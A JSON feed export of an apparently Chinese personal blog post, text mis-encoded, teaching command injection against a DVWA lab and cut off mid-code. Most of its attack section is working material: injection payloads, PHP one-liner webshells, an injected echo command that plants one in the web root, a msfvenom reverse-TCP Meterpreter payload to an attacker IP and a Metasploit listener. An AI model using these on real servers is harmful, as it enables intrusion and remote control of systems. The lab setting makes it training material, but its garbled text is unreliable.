{
    "version": "https://jsonfeed.org/version/1",
    "title": "baeçš„åšå®¢",
    "description": "baeçš„ä¸ªäººåšå®¢",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "url": "https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "title": "å‘½ä»¤æ‰§è¡Œæ¼æ´",
            "date_published": "2025-07-26T10:53:13.000Z",
            "content_html": "<h1 id=\"å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£\"><a href=\"#å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£\" class=\"headerlink\" title=\"å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£\"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£</h1><h2 id=\"ğŸ¯-å‰è¨€\"><a href=\"#ğŸ¯-å‰è¨€\" class=\"headerlink\" title=\"ğŸ¯ å‰è¨€\"></a>ğŸ¯ å‰è¨€</h2><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯Webå®‰å…¨é¢†åŸŸä¸­çš„ä¸€ç§é«˜å±æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚æœ¬æ–‡å°†æ·±å…¥è§£æå‘½ä»¤æ‰§è¡Œæ¼æ´çš„åŸç†ã€æˆå› ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠé˜²æŠ¤ç­–ç•¥ï¼Œå¹¶é€šè¿‡DVWAé¶åœºç¯å¢ƒè¿›è¡Œå®æˆ˜æ¼”ç¤ºã€‚</p>\n<hr>\n<h2 id=\"ğŸ“‹-ç›®å½•\"><a href=\"#ğŸ“‹-ç›®å½•\" class=\"headerlink\" title=\"ğŸ“‹ ç›®å½•\"></a>ğŸ“‹ ç›®å½•</h2><ol>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0\">æ¼æ´æ¦‚è¿°</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\">æ¼æ´åŸç†</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\">ç¯å¢ƒæ­å»º</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98\">æ¼æ´åˆ©ç”¨å®æˆ˜</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C\">åæ¸—é€æ“ä½œ</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD\">é˜²æŠ¤æªæ–½</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%80%BB%E7%BB%93\">æ€»ç»“</a></li>\n</ol>\n<hr>\n<h2 id=\"ğŸ”-æ¼æ´æ¦‚è¿°\"><a href=\"#ğŸ”-æ¼æ´æ¦‚è¿°\" class=\"headerlink\" title=\"ğŸ” æ¼æ´æ¦‚è¿°\"></a>ğŸ” æ¼æ´æ¦‚è¿°</h2><h3 id=\"ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ\"><a href=\"#ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ\"></a>ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ</h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCommand Execution&#x2F;Command Injectionï¼‰æ˜¯æŒ‡å½“Webåº”ç”¨ç¨‹åºéœ€è¦è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ¥å®ŒæˆæŸäº›åŠŸèƒ½æ—¶ï¼Œç”±äºå¯¹ç”¨æˆ·è¾“å…¥çš„è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„å‘½ä»¤å‚æ•°ï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤çš„å®‰å…¨æ¼æ´ã€‚</p>\n<h3 id=\"æ¼æ´å±å®³\"><a href=\"#æ¼æ´å±å®³\" class=\"headerlink\" title=\"æ¼æ´å±å®³\"></a>æ¼æ´å±å®³</h3><ul>\n<li><strong>æœåŠ¡å™¨å®Œå…¨æ§åˆ¶</strong>ï¼šè·å¾—æœåŠ¡å™¨çš„å‘½ä»¤æ‰§è¡Œæƒé™</li>\n<li><strong>æ•°æ®æ³„éœ²</strong>ï¼šè®¿é—®æ•æ„Ÿæ–‡ä»¶å’Œæ•°æ®åº“ä¿¡æ¯</li>\n<li><strong>æƒé™æå‡</strong>ï¼šé€šè¿‡ç³»ç»Ÿæ¼æ´è¿›ä¸€æ­¥æå‡æƒé™</li>\n<li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šä»¥è¢«æ”»é™·æœåŠ¡å™¨ä¸ºè·³æ¿æ”»å‡»å†…ç½‘å…¶ä»–ç³»ç»Ÿ</li>\n<li><strong>æ¶æ„è½¯ä»¶æ¤å…¥</strong>ï¼šä¸Šä¼ åé—¨ç¨‹åºæˆ–æ¶æ„è½¯ä»¶</li>\n</ul>\n<hr>\n<h2 id=\"âš™ï¸-æ¼æ´åŸç†\"><a href=\"#âš™ï¸-æ¼æ´åŸç†\" class=\"headerlink\" title=\"âš™ï¸ æ¼æ´åŸç†\"></a>âš™ï¸ æ¼æ´åŸç†</h2><h3 id=\"æŠ€æœ¯åŸç†\"><a href=\"#æŠ€æœ¯åŸç†\" class=\"headerlink\" title=\"æŠ€æœ¯åŸç†\"></a>æŠ€æœ¯åŸç†</h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´çš„æ ¹æœ¬åŸå› åœ¨äºåº”ç”¨ç¨‹åºç›´æ¥å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°ï¼Œè€Œæ²¡æœ‰è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚</p>\n<h4 id=\"å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š\"><a href=\"#å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š\" class=\"headerlink\" title=\"å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š\"></a>å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// è·å–ç”¨æˆ·è¾“å…¥çš„IPåœ°å€</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><br><span class=\"hljs-comment\">// ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°ç³»ç»Ÿå‘½ä»¤ä¸­</span><br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-comment\">// è¾“å‡ºç»“æœ</span><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;pre&gt;<span class=\"hljs-subst\">$cmd</span>&lt;/pre&gt;&quot;</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"å‘½ä»¤è¿æ¥ç¬¦\"><a href=\"#å‘½ä»¤è¿æ¥ç¬¦\" class=\"headerlink\" title=\"å‘½ä»¤è¿æ¥ç¬¦\"></a>å‘½ä»¤è¿æ¥ç¬¦</h3><p>æ”»å‡»è€…é€šå¸¸åˆ©ç”¨ä»¥ä¸‹å‘½ä»¤è¿æ¥ç¬¦æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>è¿æ¥ç¬¦</th>\n<th>è¯´æ˜</th>\n<th>ç¤ºä¾‹</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>;</code></td>\n<td>å‘½ä»¤åˆ†éš”ç¬¦</td>\n<td><code>127.0.0.1; whoami</code></td>\n</tr>\n<tr>\n<td><code>&amp;&amp;</code></td>\n<td>é€»è¾‘ä¸ï¼Œå‰ä¸€ä¸ªå‘½ä»¤æˆåŠŸåæ‰§è¡Œåä¸€ä¸ª</td>\n<td><code>127.0.0.1 &amp;&amp; whoami</code></td>\n</tr>\n<tr>\n<td>&#96;</td>\n<td></td>\n<td>&#96;</td>\n</tr>\n<tr>\n<td>&#96;</td>\n<td>&#96;</td>\n<td>ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</td>\n</tr>\n<tr>\n<td><code>&amp;</code></td>\n<td>åå°æ‰§è¡Œ</td>\n<td><code>127.0.0.1 &amp; whoami</code></td>\n</tr>\n<tr>\n<td><code>$()</code></td>\n<td>å‘½ä»¤æ›¿æ¢</td>\n<td><code>127.0.0.1$(whoami)</code></td>\n</tr>\n<tr>\n<td><code> </code></td>\n<td>åå¼•å·å‘½ä»¤æ›¿æ¢</td>\n<td><code>127.0.0.1</code>whoami<code> </code></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"ğŸŒ-ç¯å¢ƒæ­å»º\"><a href=\"#ğŸŒ-ç¯å¢ƒæ­å»º\" class=\"headerlink\" title=\"ğŸŒ ç¯å¢ƒæ­å»º\"></a>ğŸŒ ç¯å¢ƒæ­å»º</h2><h3 id=\"é¶åœºç¯å¢ƒé…ç½®\"><a href=\"#é¶åœºç¯å¢ƒé…ç½®\" class=\"headerlink\" title=\"é¶åœºç¯å¢ƒé…ç½®\"></a>é¶åœºç¯å¢ƒé…ç½®</h3><p><strong>ç³»ç»Ÿç¯å¢ƒï¼š</strong></p>\n<ul>\n<li>æ“ä½œç³»ç»Ÿï¼šWindows 7</li>\n<li>WebæœåŠ¡å™¨ï¼šPHPStudy</li>\n<li>é¶åœºç¨‹åºï¼šDVWA</li>\n<li>DVWAè·¯å¾„ï¼š<code>C:\\download\\phpstudy\\phpstudy_pro\\WWW\\DVWA</code></li>\n<li>è®¿é—®åœ°å€ï¼š<code>http://192.168.147.136/DVWA/</code></li>\n</ul>\n<h3 id=\"ç¯å¢ƒå‡†å¤‡æ­¥éª¤\"><a href=\"#ç¯å¢ƒå‡†å¤‡æ­¥éª¤\" class=\"headerlink\" title=\"ç¯å¢ƒå‡†å¤‡æ­¥éª¤\"></a>ç¯å¢ƒå‡†å¤‡æ­¥éª¤</h3><ol>\n<li><strong>å®‰è£…PHPStudy</strong><ul>\n<li>ä¸‹è½½å¹¶å®‰è£…PHPStudyé›†æˆç¯å¢ƒ</li>\n<li>å¯åŠ¨Apacheå’ŒMySQLæœåŠ¡</li>\n</ul>\n</li>\n<li><strong>éƒ¨ç½²DVWA</strong><ul>\n<li>ä¸‹è½½DVWAæºç </li>\n<li>è§£å‹åˆ°PHPStudyçš„WWWç›®å½•</li>\n<li>é…ç½®æ•°æ®åº“è¿æ¥</li>\n</ul>\n</li>\n<li><strong>è®¾ç½®å®‰å…¨ç­‰çº§</strong><ul>\n<li>ç™»å½•DVWAç®¡ç†ç•Œé¢</li>\n<li>å¯¼èˆªè‡³DVWA Security</li>\n<li>å°†å®‰å…¨ç­‰çº§è®¾ç½®ä¸ºLow</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"ğŸ’¥-æ¼æ´åˆ©ç”¨å®æˆ˜\"><a href=\"#ğŸ’¥-æ¼æ´åˆ©ç”¨å®æˆ˜\" class=\"headerlink\" title=\"ğŸ’¥ æ¼æ´åˆ©ç”¨å®æˆ˜\"></a>ğŸ’¥ æ¼æ´åˆ©ç”¨å®æˆ˜</h2><h3 id=\"ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢\"><a href=\"#ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢\" class=\"headerlink\" title=\"ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢\"></a>ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢</h3><p>æ‰“å¼€æµè§ˆå™¨è®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´æµ‹è¯•é¡µé¢ï¼š</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">147.136</span><span class=\"hljs-regexp\">/DVWA/</span>vulnerabilities<span class=\"hljs-regexp\">/exec/</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•\"><a href=\"#ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•\" class=\"headerlink\" title=\"ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•\"></a>ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•</h3><p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ä»¥ä¸‹Payloadè¿›è¡Œæµ‹è¯•ï¼š</p>\n<figure class=\"highlight accesslog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs accesslog\"><span class=\"hljs-number\">127.0.0.1</span> &amp;&amp; whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>é¢„æœŸç»“æœï¼š</strong></p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes <span class=\"hljs-keyword\">from</span> 127.0.0.1: <span class=\"hljs-attribute\">icmp_seq</span>=1 <span class=\"hljs-attribute\">ttl</span>=64 <span class=\"hljs-attribute\">time</span>=0.042 ms<br><span class=\"hljs-built_in\">..</span>.<br><br>nt authority\\system<br></code></pre></td></tr></table></figure>\n\n<p>å¦‚æœçœ‹åˆ°<code>nt authority\\system</code>è¾“å‡ºï¼Œè¯´æ˜å‘½ä»¤æ³¨å…¥æˆåŠŸï¼</p>\n<h3 id=\"ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†\"><a href=\"#ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†\" class=\"headerlink\" title=\"ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†\"></a>ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†</h3><p>ä½¿ç”¨ä¸åŒçš„å‘½ä»¤æ”¶é›†ç³»ç»Ÿä¿¡æ¯ï¼š</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-comment\"># æŸ¥çœ‹å½“å‰ç”¨æˆ·</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; whoami<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; systeminfo<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹ç½‘ç»œé…ç½®</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; ipconfig<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; dir<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; tasklist<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ğŸ¯-åæ¸—é€æ“ä½œ\"><a href=\"#ğŸ¯-åæ¸—é€æ“ä½œ\" class=\"headerlink\" title=\"ğŸ¯ åæ¸—é€æ“ä½œ\"></a>ğŸ¯ åæ¸—é€æ“ä½œ</h2><h3 id=\"æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell\"><a href=\"#æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell\" class=\"headerlink\" title=\"æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell\"></a>æ–¹æ³•ä¸€ï¼šä¸Šä¼ Webshell</h3><h4 id=\"1-å‡†å¤‡ä¸€å¥è¯æœ¨é©¬\"><a href=\"#1-å‡†å¤‡ä¸€å¥è¯æœ¨é©¬\" class=\"headerlink\" title=\"1. å‡†å¤‡ä¸€å¥è¯æœ¨é©¬\"></a>1. å‡†å¤‡ä¸€å¥è¯æœ¨é©¬</h4><p>åˆ›å»º<code>shell.php</code>æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pass&#x27;</span>]); <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>æˆ–è€…ä½¿ç”¨Base64ç¼–ç ç‰ˆæœ¬ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-title function_ invoke__\">base64_decode</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>])); <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ \"><a href=\"#2-é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ \" class=\"headerlink\" title=\"2. é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ \"></a>2. é€šè¿‡å‘½ä»¤æ³¨å…¥ä¸Šä¼ </h4><p>ä½¿ç”¨echoå‘½ä»¤å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; <span class=\"hljs-keyword\">echo</span> ^<span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pass&#x27;</span>]); ?^&gt; &gt; C:\\download\\phpstudy\\phpstudy_pro\\WWW\\DVWA\\shell.php<br></code></pre></td></tr></table></figure>\n\n<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>\n<ul>\n<li><code>^</code>ç¬¦å·æ˜¯Windows cmdçš„è½¬ä¹‰ç¬¦</li>\n<li><code>&gt;</code>ç¬¦å·ç”¨äºé‡å®šå‘è¾“å‡ºåˆ°æ–‡ä»¶</li>\n<li>è·¯å¾„å¿…é¡»æ˜¯Webç›®å½•ä¸‹å¯è®¿é—®çš„ä½ç½®</li>\n</ul>\n<h4 id=\"3-éªŒè¯ä¸Šä¼ æˆåŠŸ\"><a href=\"#3-éªŒè¯ä¸Šä¼ æˆåŠŸ\" class=\"headerlink\" title=\"3. éªŒè¯ä¸Šä¼ æˆåŠŸ\"></a>3. éªŒè¯ä¸Šä¼ æˆåŠŸ</h4><p>è®¿é—®ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">147.136</span><span class=\"hljs-regexp\">/DVWA/</span>shell.php<br></code></pre></td></tr></table></figure>\n\n<p>å¦‚æœé¡µé¢æ˜¾ç¤ºç©ºç™½ï¼Œè¯´æ˜PHPæ–‡ä»¶ä¸Šä¼ æˆåŠŸã€‚</p>\n<h3 id=\"æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥\"><a href=\"#æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥\" class=\"headerlink\" title=\"æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥\"></a>æ–¹æ³•äºŒï¼šä½¿ç”¨èšå‰‘è¿æ¥</h3><h4 id=\"1-é…ç½®èšå‰‘è¿æ¥\"><a href=\"#1-é…ç½®èšå‰‘è¿æ¥\" class=\"headerlink\" title=\"1. é…ç½®èšå‰‘è¿æ¥\"></a>1. é…ç½®èšå‰‘è¿æ¥</h4><p><strong>è¿æ¥å‚æ•°ï¼š</strong></p>\n<ul>\n<li>URL: <code>http://192.168.147.136/DVWA/shell.php</code></li>\n<li>å¯†ç : <code>pass</code></li>\n<li>ç¼–ç : <code>UTF-8</code></li>\n<li>ç±»å‹: <code>PHP</code></li>\n</ul>\n<h4 id=\"2-åŠŸèƒ½æ¼”ç¤º\"><a href=\"#2-åŠŸèƒ½æ¼”ç¤º\" class=\"headerlink\" title=\"2. åŠŸèƒ½æ¼”ç¤º\"></a>2. åŠŸèƒ½æ¼”ç¤º</h4><p>é€šè¿‡èšå‰‘å¯ä»¥å®ç°ï¼š</p>\n<ul>\n<li>æ–‡ä»¶ç®¡ç†ï¼šæµè§ˆã€ä¸Šä¼ ã€ä¸‹è½½ã€ç¼–è¾‘æ–‡ä»¶</li>\n<li>æ•°æ®åº“ç®¡ç†ï¼šè¿æ¥å’Œæ“ä½œæ•°æ®åº“</li>\n<li>è™šæ‹Ÿç»ˆç«¯ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>\n<li>åå‘ä»£ç†ï¼šå»ºç«‹éš§é“è¿æ¥</li>\n</ul>\n<h3 id=\"æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ\"><a href=\"#æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ\" class=\"headerlink\" title=\"æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ\"></a>æ–¹æ³•ä¸‰ï¼šMSFææƒæ“ä½œ</h3><h4 id=\"1-ç”ŸæˆMeterpreteræœ¨é©¬\"><a href=\"#1-ç”ŸæˆMeterpreteræœ¨é©¬\" class=\"headerlink\" title=\"1. ç”ŸæˆMeterpreteræœ¨é©¬\"></a>1. ç”ŸæˆMeterpreteræœ¨é©¬</h4><p>åœ¨Kali Linuxä¸­æ‰§è¡Œï¼š</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs zsh\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>\n\n<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>\n<ul>\n<li><code>-p</code>: æŒ‡å®šPayloadç±»å‹</li>\n<li><code>LHOST</code>: æ”»å‡»è€…IPåœ°å€</li>\n<li><code>LPORT</code>: ç›‘å¬ç«¯å£</li>\n<li><code>-f</code>: è¾“å‡ºæ ¼å¼</li>\n</ul>\n<h4 id=\"2-ä¸Šä¼ æœ¨é©¬æ–‡ä»¶\"><a href=\"#2-ä¸Šä¼ æœ¨é©¬æ–‡ä»¶\" class=\"headerlink\" title=\"2. ä¸Šä¼ æœ¨é©¬æ–‡ä»¶\"></a>2. ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</h4><p>é€šè¿‡èšå‰‘å°†ç”Ÿæˆçš„<code>shell.exe</code>ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼š</p>\n<figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs basic\">C:\\Users\\Public\\<span class=\"hljs-keyword\">shell</span>.exe<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-é…ç½®MSFç›‘å¬å™¨\"><a href=\"#3-é…ç½®MSFç›‘å¬å™¨\" class=\"headerlink\" title=\"3. é…ç½®MSFç›‘å¬å™¨\"></a>3. é…ç½®MSFç›‘å¬å™¨</h4><p>å¯åŠ¨Metasploitï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">msfconsole<br></code></pre></td></tr></table></figure>\n\n<p>é…ç½®ç›‘å¬å™¨ï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">use exploit/multi/handler<br><span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_tcp<br><span class=\"hljs-built_in\">set</span> lhost 192.168.147.129<br><span class=\"hljs-built_in\">set</span> lport 4444<br>exploit<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯\"><a href=\"#4-æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯\" class=\"headerlink\" title=\"4. æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯\"></a>4. æ‰§è¡Œæœ¨é©¬è·å–Meterpreterä¼šè¯</h4><p>åœ¨èšå‰‘ç»ˆç«¯æˆ–é€šè¿‡å‘½ä»¤æ³¨å…¥æ‰§è¡Œï¼š</p>\n<figure class=\"highlight vbnet\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vbnet\"><span class=\"hljs-symbol\">C:</span>\\Users\\<span class=\"hljs-keyword\">Public</span>\\shell.exe<br></code></pre></td></tr></table></figure>\n\n<p>æˆåŠŸå»ºç«‹è¿æ¥åï¼Œå¯ä»¥ä½¿ç”¨Meterpreterçš„å¼ºå¤§åŠŸèƒ½ï¼š</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\"># </span><span 